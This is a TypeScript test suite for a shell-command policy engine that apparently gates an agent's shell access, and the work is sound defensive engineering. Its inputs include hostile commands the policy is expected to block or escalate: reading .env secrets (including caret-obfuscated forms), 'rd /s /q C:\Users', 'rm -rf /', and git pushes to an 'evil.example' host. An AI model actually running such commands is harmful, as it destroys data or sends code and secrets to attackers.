/**
 * Shell policy file loading, override wiring, custom policy-file rules and the stats/redaction helpers.
 *
 * Covers the parts of `lib/shell-policy.ts`, `lib/shell-policy-evaluate.ts` and
 * `lib/shell-policy-stats.ts` that the table-driven adversarial suites never reach: operator policy
 * files (allow/ask/deny rules, mode precedence, malformed input), `VENIRA_SHELL_OVERRIDES`, the
 * `ALLOW_GIT_PUSH` / `ALLOW_ENV_READ` matchers, command hashing/keys, secret redaction and counters.
 *
 * Run with: npm run test:shell-policy-file
 */
import "./clean-env.js"; // must stay first: inherited VENIRA_* env (shell mode, unrestricted) would skew every verdict
import assert from "node:assert/strict";
import { mkdtemp, mkdir, rm, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";

const tempDir = await mkdtemp(path.join(os.tmpdir(), "venira-shell-policy-file-"));
const workspaceDir = path.join(tempDir, "workspace");
const dataDir = path.join(tempDir, "data"); // sibling: a data dir above the workspace would protect every path
await mkdir(workspaceDir);
await mkdir(dataDir);
process.env.VENIRA_WORKSPACE = workspaceDir;
process.env.VENIRA_DATA_DIR = dataDir;

const policy = await import("../lib/shell-policy.js");

let checks = 0;
async function check(name: string, fn: () => void | Promise<void>) {
  await fn();
  checks += 1;
  console.log(`ok ${checks} - ${name}`);
}

/** Capture console.error so expected warnings do not pollute the test output. */
function captureErrors<T>(fn: () => T): { result: T; logs: string[] } {
  const original = console.error;
  const logs: string[] = [];
  console.error = (...args: unknown[]) => {
    logs.push(args.map(String).join(" "));
  };
  try {
    return { result: fn(), logs };
  } finally {
    console.error = original;
  }
}

/** Run `fn` with the given VENIRA_* env on a fresh policy cache, restoring everything afterwards. */
function withEnv<T>(env: Record<string, string | undefined>, fn: () => T): T {
  const saved: Record<string, string | undefined> = {};
  for (const [key, value] of Object.entries(env)) {
    saved[key] = process.env[key];
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
  policy.resetShellPolicyCache();
  try {
    return fn();
  } finally {
    for (const [key, value] of Object.entries(saved)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
    policy.resetShellPolicyCache();
  }
}

async function policyFile(name: string, body: unknown): Promise<string> {
  const file = path.join(tempDir, name);
  await writeFile(file, typeof body === "string" ? body : JSON.stringify(body), "utf8");
  return file;
}

// ---------------------------------------------------------------------------
// Policy file loading
// ---------------------------------------------------------------------------

const rulesFile = await policyFile("rules.json", {
  mode: "strict",
  allow: [{ command: "Mytool", id: "allow-mytool", reason: "ok" }, { command: "plain" }, { nocommand: 1 }, "text", null],
  ask: [{ command: "Git", subcommand: "Stash", args_regex: "pop", id: "ask-stash", reason: "stash needs a look" }],
  deny: [{ command: "frobnicate", id: "no-frob", args_regex: "--force", reason: "no forced frobbing" }, { command: "badre", id: "no-badre", args_regex: "([" }],
});

await check("policy_file_rules_and_mode_are_loaded_and_normalised", () => {
  withEnv({ VENIRA_SHELL_POLICY_FILE: rulesFile }, () => {
    const loaded = policy.loadShellPolicy();
    assert.equal(loaded.mode, "strict");
    assert.equal(loaded.source, rulesFile);
    assert.equal(loaded.allow.length, 2, "entries without a command, non-objects and null are skipped");
    assert.deepEqual(loaded.allow[0], { id: "allow-mytool", tier: "allow", command: "mytool", reason: "ok" });
    assert.equal(loaded.allow[1].id, "allow_plain", "missing id defaults to <tier>_<command>");
    assert.deepEqual(loaded.ask[0], {
      id: "ask-stash", tier: "ask", command: "git", subcommand: "stash", args_regex: "pop", reason: "stash needs a look",
    });
    assert.equal(loaded.deny.length, 2);
    const described = policy.describeShellPolicy();
    assert.deepEqual(described.rules, { allow: 2, ask: 1, deny: 2 });
    assert.ok(described.builtin.deny > 0 && described.builtin.ask > 0);
    assert.equal(policy.loadShellPolicy(), loaded, "the policy is cached until reset");
  });
});

await check("policy_file_mode_is_overridden_by_env_mode", async () => {
  withEnv({ VENIRA_SHELL_POLICY_FILE: rulesFile, VENIRA_SHELL_MODE: "permissive" }, () => {
    assert.equal(policy.loadShellPolicy().mode, "permissive");
  });
  withEnv({ VENIRA_SHELL_POLICY_FILE: rulesFile, VENIRA_SHELL_MODE: "  STRICT " }, () => {
    assert.equal(policy.loadShellPolicy().mode, "strict", "env mode is trimmed and case-insensitive");
  });
});

await check("invalid_modes_fail_closed_with_config_invalid", () => {
  withEnv({ VENIRA_SHELL_MODE: "yolo" }, () => {
    assert.throws(() => policy.loadShellPolicy(), /\[config_invalid\] VENIRA_SHELL_MODE/);
  });
  const badMode = path.join(tempDir, "bad-mode.json");
  return writeFile(badMode, JSON.stringify({ mode: "yolo" }), "utf8").then(() => {
    withEnv({ VENIRA_SHELL_POLICY_FILE: badMode }, () => {
      assert.throws(() => policy.loadShellPolicy(), /\[config_invalid\] shell policy mode/);
    });
  });
});

await check("unreadable_or_missing_policy_file_falls_back_to_builtin", async () => {
  const broken = await policyFile("broken.json", "{ not json");
  const unreadable = captureErrors(() =>
    withEnv({ VENIRA_SHELL_POLICY_FILE: broken }, () => policy.loadShellPolicy()),
  );
  assert.equal(unreadable.result.source, "builtin (policy file unreadable)");
  assert.equal(unreadable.result.mode, "balanced");
  assert.ok(unreadable.logs.some((line) => line.includes("ignoring")), "the problem is reported");

  const missing = captureErrors(() =>
    withEnv({ VENIRA_SHELL_POLICY_FILE: path.join(tempDir, "nope.json") }, () => policy.loadShellPolicy()),
  );
  assert.equal(missing.result.source, "builtin (policy file missing)");
  assert.equal(missing.result.allow.length + missing.result.ask.length + missing.result.deny.length, 0);
  assert.ok(missing.logs.some((line) => line.includes("not found")));
});

await check("off_mode_and_removed_auto_approve_token_warn_loudly", () => {
  const off = captureErrors(() => withEnv({ VENIRA_SHELL_MODE: "off" }, () => policy.loadShellPolicy().mode));
  assert.equal(off.result, "off");
  assert.ok(off.logs.some((line) => line.includes("disables ALL shell policy checks")));

  const token = captureErrors(() => withEnv({ VENIRA_SHELL_AUTO_APPROVE_TOKEN: "yes" }, () => policy.loadShellPolicy().mode));
  assert.equal(token.result, "balanced", "the removed token does not change the mode");
  assert.ok(token.logs.some((line) => line.includes("removed in v1.15")));
});

await check("security_profile_sets_the_baseline_mode_but_env_mode_wins", () => {
  withEnv({ VENIRA_SECURITY_PROFILE: "strict" }, () => {
    assert.equal(policy.loadShellPolicy().mode, "strict");
  });
  withEnv({ VENIRA_SECURITY_PROFILE: "strict", VENIRA_SHELL_MODE: "balanced" }, () => {
    assert.equal(policy.loadShellPolicy().mode, "balanced");
  });
});

// ---------------------------------------------------------------------------
// Overrides
// ---------------------------------------------------------------------------

await check("override_names_are_validated", () => {
  assert.equal(policy.isShellOverride("ALLOW_ENV_READ"), true);
  assert.equal(policy.isShellOverride("ALLOW_GIT_PUSH"), false, "the git push override no longer exists: plain pushes are routine");
  assert.equal(policy.isShellOverride("ALLOW_EVERYTHING"), false);
  assert.equal(policy.isShellOverride(42), false);
  assert.deepEqual([...withEnv({ VENIRA_SHELL_OVERRIDES: undefined }, () => policy.enabledShellOverrides())], []);
  assert.deepEqual([...withEnv({ VENIRA_SHELL_OVERRIDES: "  " }, () => policy.enabledShellOverrides())], []);
  assert.deepEqual(
    [...withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_ENV_READ" }, () => policy.enabledShellOverrides())],
    ["ALLOW_ENV_READ"],
  );
  assert.throws(
    () => withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_GIT_PUSH" }, () => policy.enabledShellOverrides()),
    /\[config_invalid\] VENIRA_SHELL_OVERRIDES accepts only: ALLOW_ENV_READ/,
  );
});

await writeFile(path.join(workspaceDir, ".env"), "SECRET=1\n");
await writeFile(path.join(workspaceDir, ".env.local"), "SECRET=2\n");
await writeFile(path.join(workspaceDir, "config.json"), "{}\n");
await writeFile(path.join(tempDir, ".env"), "OUTSIDE_SECRET=1\n");
await writeFile(path.join(tempDir, "outside-report.txt"), "outside\n");
await mkdir(path.join(workspaceDir, ".env.d"));
let symlinkCreated = false;
let outsideSymlinksCreated = false;
try {
  await symlink(path.join(workspaceDir, ".env"), path.join(workspaceDir, ".env.link"));
  symlinkCreated = true;
} catch {
  // Symlinks may need elevated rights on Windows; the symlink assertion is skipped there.
}
try {
  await symlink(path.join(tempDir, ".env"), path.join(workspaceDir, "benign-config.txt"));
  await symlink(path.join(tempDir, "outside-report.txt"), path.join(workspaceDir, "outside-link.txt"));
  outsideSymlinksCreated = true;
} catch {
  // Symlinks may need elevated rights on Windows; the symlink assertion is skipped there.
}

await check("cmd_caret_cannot_obfuscate_protected_file_access", () => {
  const caretRead = policy.evaluateShellCommand("type .e^nv", workspaceDir, { shell: "cmd", mode: "balanced" });
  assert.deepEqual([caretRead.tier, caretRead.rule], ["deny", "deny.protected_file_access"]);
  const quotedRead = policy.evaluateShellCommand('type "C:\\Users\\.env"', workspaceDir, { shell: "cmd", mode: "balanced" });
  assert.deepEqual([quotedRead.tier, quotedRead.rule], ["deny", "deny.protected_file_access"]);
  const singleQuoteEscape = policy.evaluateShellCommand("echo 'before & rd /s /q C:\\Users'", workspaceDir, {
    shell: "cmd",
    mode: "balanced",
  });
  assert.equal(singleQuoteEscape.tier, "deny");
  const groupedDelete = policy.evaluateShellCommand("(rd /s /q C:\\Users)", workspaceDir, { shell: "cmd", mode: "permissive" });
  assert.equal(groupedDelete.tier, "ask");
  const groupedCommand = policy.evaluateShellCommand("(echo safe)", workspaceDir, { shell: "cmd", mode: "permissive" });
  assert.deepEqual([groupedCommand.tier, groupedCommand.rule], ["ask", "ask.command_substitution"]);
});

await check("read_paths_resolve_symlinks_for_workspace_and_protected_checks", () => {
  if (!outsideSymlinksCreated) return;
  const protectedAlias = policy.evaluateShellCommand("cat benign-config.txt", workspaceDir, { shell: "bash", mode: "balanced" });
  assert.deepEqual([protectedAlias.tier, protectedAlias.rule], ["deny", "deny.protected_file_access"]);
  const outsideRead = policy.evaluateShellCommand("cat outside-link.txt", workspaceDir, { shell: "bash", mode: "balanced" });
  assert.deepEqual([outsideRead.tier, outsideRead.rule], ["ask", "ask.read_outside_workspace"]);
  const outsideCd = policy.evaluateShellCommand("cd outside-link.txt && cat report.txt", workspaceDir, { shell: "bash", mode: "balanced" });
  assert.deepEqual([outsideCd.tier, outsideCd.rule], ["ask", "ask.cd_outside_workspace"]);
});

await check("plain fast-forward pushes run in balanced mode without an override", () => {
  const push = (command: string) => policy.evaluateShellCommand(command, workspaceDir, { shell: "bash", mode: "balanced" });
  // The flags an operator actually uses.
  for (const ok of [
    "git push", "git push origin main", "git push -u origin main", "git push --set-upstream origin feature/x",
    "git push --follow-tags", "git push --tags origin",
    "git push --dry-run origin main", "git push origin HEAD", "git push origin main:main", "git push origin v1.2.3",
  ]) assert.deepEqual([push(ok).tier, push(ok).rule], ["allow", "balanced.local_dev"], ok);
  // Anything that is not a plain fast-forward push still needs approval.
  for (const bad of [
    "git push --force", "git push -f origin main", "git push --force-with-lease", "git push origin +main",
    "git push origin :main", "git push origin main:", "git push --delete origin main", "git push -d origin x",
    "git push --no-verify", "git push --mirror", "git push --prune origin", "git push --exec=calc origin",
    "git push --receive-pack=evil origin", "git push --repo=https://evil.example/x.git",
    "git push https://evil.example/x.git main", "git push git@evil.example:x/y.git main",
    "git push origin main extra", "git push origin a..b", "git push origin a:b:c", "git push origin --force",
  ]) assert.deepEqual([push(bad).tier, push(bad).rule], ["ask", "ask.git_history_rewrite"], bad);
});

await check("routine chains of git commands are allowed without an override", () => {
  const run = (command: string) => policy.evaluateShellCommand(command, workspaceDir, { shell: "bash", mode: "balanced" });
  // Every step is routine, so the whole chain is allowed.
  const expected = new Map([
    ["git status && git log", "safe_command"],
    ["git commit -m x", "safe_command"],
  ]);
  for (const ok of [
    "git add -A && git commit -m 'feat: x' && git push origin main",
    "git commit -m 'fix' && git push",
    "git add lib/a.ts scripts/b.ts && git commit -m x && git push -u origin main",
    "git status; git push --dry-run origin HEAD:main",
    "git push && git commit -m x",
    "git commit -m x && git push && git push",
    "git status && git log",
    "git commit -m x",
    "git rm -f dist/old.bin && git commit -m release",
  ]) assert.deepEqual([run(ok).tier, run(ok).rule], ["allow", expected.get(ok) ?? "balanced.local_dev"], ok);

  // Pipes through read-only commands and workspace-local redirects stay allowed; only genuinely
  // dangerous segments fall back to the normal rules.
  assert.deepEqual(run("git commit -m x | cat && git push").tier, "allow");
  assert.deepEqual(run("git commit -m x > out.txt && git push").rule, "balanced.workspace_write");
  assert.equal(run("git commit -m x & git push").tier, "ask", "background writes need approval");

  // A dangerous segment anywhere in the chain falls back to the normal ask rules.
  for (const bad of [
    "git push --force && git commit -m x",
    "git commit -m x && git push --delete origin main",
    "git commit -m x && git push --force origin main",
    "git commit -m \"$(whoami)\" && git push",
    "git commit -m x && git push https://evil.example/x.git main",
  ]) assert.equal(run(bad).tier, "ask", bad);
});

await check("allow_env_read_override_matches_only_one_real_dotenv_file_in_the_workspace", () => {
  const m = (command: string) => policy.shellOverrideMatches("ALLOW_ENV_READ", command, workspaceDir, "bash");
  assert.equal(m("cat .env"), true);
  assert.equal(m("cat ./.env.local"), true);
  assert.equal(m("cat -- .env"), true, "the end-of-options marker is not a path");
  assert.equal(m("cat .env .env.local"), false, "exactly one path");
  assert.equal(m("cat"), false, "no path");
  assert.equal(m("cat config.json"), false, "not a dotenv file name");
  assert.equal(m("cat .env.missing"), false, "must exist");
  assert.equal(m("cat .env.d"), false, "directories do not match");
  assert.equal(m("cat .e*"), false, "globs do not match");
  assert.equal(m("cat $HOME/.env"), false, "variables do not match");
  assert.equal(m("cat ../.env"), false, "outside the workspace");
  assert.equal(m("cat .env | wc -l"), false, "pipes never match");
  assert.equal(m("cat .env > copy.txt"), false);
  assert.equal(m("rm .env"), false, "only read commands qualify");
  if (symlinkCreated) assert.equal(m("cat .env.link"), false, "symlinks do not match");
});

// ---------------------------------------------------------------------------
// Evaluation with operator policy files and overrides
// ---------------------------------------------------------------------------

await check("custom_deny_ask_and_allow_rules_drive_the_verdict", () => {
  withEnv({ VENIRA_SHELL_POLICY_FILE: rulesFile, VENIRA_SHELL_MODE: "balanced" }, () => {
    const ev = (command: string, mode?: "balanced" | "permissive" | "strict") =>
      policy.evaluateShellCommand(command, workspaceDir, { shell: "bash", ...(mode ? { mode } : {}) });

    const denied = ev("frobnicate --force now");
    assert.deepEqual([denied.tier, denied.rule, denied.reason], ["deny", "no-frob", "no forced frobbing"]);
    const degraded = ev("frobnicate --force now", "permissive");
    assert.deepEqual([degraded.tier, degraded.rule], ["ask", "ask.deny.no-frob"], "operator deny degrades to ask in permissive");
    assert.notEqual(ev("frobnicate --gently").rule, "no-frob", "args_regex must match the joined arguments");

    const asked = ev("git stash pop");
    assert.deepEqual([asked.tier, asked.rule, asked.reason], ["ask", "ask-stash", "stash needs a look"]);
    assert.notEqual(ev("git stash list").rule, "ask-stash", "args_regex narrows the ask rule");

    const allowed = ev("mytool run");
    assert.deepEqual([allowed.tier, allowed.rule, allowed.reason], ["allow", "allow-mytool", "ok"]);
    assert.equal(ev("mytool run", "strict").rule, "strict.default_ask", "policy-file allow rules are balanced-only");

    const invalidRegex = ev("badre x");
    assert.notEqual(invalidRegex.tier, "deny", "an invalid args_regex never matches");
    assert.equal(invalidRegex.rule, "balanced.default_ask");
  });
});

await check("hard_deny_still_beats_operator_allow_rules", () => {
  const allowEnv = path.join(tempDir, "allow-cat.json");
  return writeFile(allowEnv, JSON.stringify({ allow: [{ command: "cat", id: "allow-cat" }] }), "utf8").then(() => {
    withEnv({ VENIRA_SHELL_POLICY_FILE: allowEnv }, () => {
      const decision = policy.evaluateShellCommand("cat .env", workspaceDir, { shell: "bash", mode: "balanced" });
      assert.equal(decision.tier, "deny");
      assert.equal(decision.rule, "deny.protected_file_access");
    });
  });
});

await check("overrides_need_env_enablement_a_reason_and_a_matching_command", () => {
  const ev = (command: string, override: "ALLOW_ENV_READ", reason?: string) =>
    policy.evaluateShellCommand(command, workspaceDir, {
      shell: "bash", mode: "balanced", override, ...(reason === undefined ? {} : { overrideReason: reason }),
    });
  withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_ENV_READ" }, () => {
    const env = ev("cat .env", "ALLOW_ENV_READ", "debugging config");
    assert.deepEqual([env.tier, env.rule], ["allow", "override.ALLOW_ENV_READ"]);
    const noReason = ev("cat .env", "ALLOW_ENV_READ");
    assert.deepEqual([noReason.tier, noReason.rule], ["deny", "deny.protected_file_access"]);
    assert.equal(ev("cat .env .env.local", "ALLOW_ENV_READ", "x").rule, "deny.protected_file_access", "two paths do not qualify");
  });
  withEnv({ VENIRA_SHELL_OVERRIDES: undefined }, () => {
    assert.equal(ev("cat .env", "ALLOW_ENV_READ", "debugging").rule, "deny.protected_file_access");
  });
  withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_GIT_PUSH" }, () => {
    assert.throws(
      () => ev("cat .env", "ALLOW_ENV_READ", "debugging"),
      /\[config_invalid\] VENIRA_SHELL_OVERRIDES accepts only: ALLOW_ENV_READ/,
      "ALLOW_GIT_PUSH was removed; the unknown name fails closed on every shell call",
    );
  });
});

await check("empty_and_off_mode_short_circuits", () => {
  const empty = policy.evaluateShellCommand("   ", workspaceDir, { shell: "bash", mode: "balanced" });
  assert.deepEqual([empty.tier, empty.rule], ["allow", "empty"]);
  const off = policy.evaluateShellCommand("rm -rf /", workspaceDir, { shell: "bash", mode: "off" });
  assert.deepEqual([off.tier, off.rule], ["allow", "off.pass"], "off mode bypasses everything, by explicit operator opt-in");
});

await check("command_hash_and_key", () => {
  assert.equal(policy.commandHash("git status\r\n"), policy.commandHash("git status"));
  assert.equal(policy.commandHash("a\r\nb"), policy.commandHash("a\nb"), "CRLF is normalised");
  assert.notEqual(policy.commandHash("git status"), policy.commandHash("git log"));
  assert.match(policy.commandHash("x"), /^[0-9a-f]{32}$/);
  const decision = policy.evaluateShellCommand("git status", workspaceDir, { shell: "bash", mode: "balanced" });
  assert.equal(decision.command_hash, policy.commandHash("git status"));
  const key = (command: string) => policy.commandKey(policy.parseShellCommand(command, { shell: "bash" }));
  assert.equal(key("git push origin main"), "git push");
  assert.equal(key("ls -la"), "ls");
  assert.equal(key(""), "empty");
});

// ---------------------------------------------------------------------------
// Redaction and counters
// ---------------------------------------------------------------------------

await check("redact_secrets_masks_common_credential_shapes", () => {
  const cases: Array<[string, string]> = [
    ["deploy --password hunter2 now", "hunter2"],
    ["curl --token=abc123def", "abc123def"],
    ["curl -H 'Authorization: Bearer sk-live-12345'", "sk-live-12345"],
    ["git clone https://user:s3cretpw@example.com/repo.git", "s3cretpw"],
    ["key AKIAABCDEFGHIJKLMNOP end", "AKIAABCDEFGHIJKLMNOP"],
    [`token ghp_${"a".repeat(30)} end`, "ghp_aaaa"],
    [`token github_pat_${"B".repeat(30)}`, "github_pat_BBBB"],
    [`npm_${"c".repeat(36)}`, "npm_cccc"],
    ["xoxb-1234567890-abcdefghij", "xoxb-1234567890"],
    ["jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r", "eyJhbGciOiJIUzI1NiJ9"],
    ["export API_TOKEN=abc123", "abc123"],
    ["MY_SECRET='top secret value'", "top secret value"],
    ["DATABASE_URL=postgres://u:p@h/db", "postgres://u"],
    ['let t = env::var("GITHUB_TOKEN").unwrap();', "GITHUB_TOKEN"],
  ];
  for (const [input, secret] of cases) {
    const output = policy.redactSecrets(input);
    assert.ok(!output.includes(secret), `${input} -> ${output}`);
    assert.ok(output.includes("[REDACTED]"), `${input} -> ${output}`);
  }
  assert.equal(policy.redactSecrets("git status --short"), "git status --short", "ordinary text is untouched");
  assert.equal(policy.redactSecrets(""), "");
});

await check("shell_stats_count_decisions_and_runtime_events", () => {
  const before = policy.shellStats();
  const base = { reason: "t", mode: "balanced" as const, command_hash: "h" };
  policy.recordDecision({ ...base, tier: "allow", rule: "a" });
  policy.recordDecision({ ...base, tier: "ask", rule: "b" });
  policy.recordDecision({ ...base, tier: "ask", rule: "b" });
  policy.recordDecision({ ...base, tier: "deny", rule: "c" });
  for (const kind of ["approved", "timed_out", "timeout_warn", "killed_tree", "output_capped"] as const) {
    policy.recordApproval(kind);
  }
  const after = policy.shellStats();
  assert.equal(after.evaluated - before.evaluated, 4);
  assert.equal(after.allowed - before.allowed, 1);
  assert.equal(after.asked - before.asked, 2);
  assert.equal(after.denied - before.denied, 1);
  for (const kind of ["approved", "timed_out", "timeout_warn", "killed_tree", "output_capped"] as const) {
    assert.equal(after[kind] - before[kind], 1, kind);
  }
  after.evaluated = -1; // the snapshot is a copy: mutating it must not touch the live counters
  assert.equal(policy.shellStats().evaluated, before.evaluated + 4);
});

await rm(tempDir, { recursive: true, force: true });
console.log(`Shell policy file/override tests passed (${checks} checks).`);
